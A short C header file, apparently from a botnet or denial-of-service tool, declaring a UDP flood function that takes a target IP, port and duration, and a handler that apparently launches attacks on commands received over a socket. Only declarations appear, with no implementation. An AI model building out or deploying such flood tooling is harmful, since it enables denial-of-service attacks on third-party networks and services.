#ifndef ATTACKS_H
#define ATTACKS_H

void udp_attack(char *target_ip, int target_port, int duration);
void handle_attack_command(int sock, char *target_ip, int target_port, int duration);

#endif
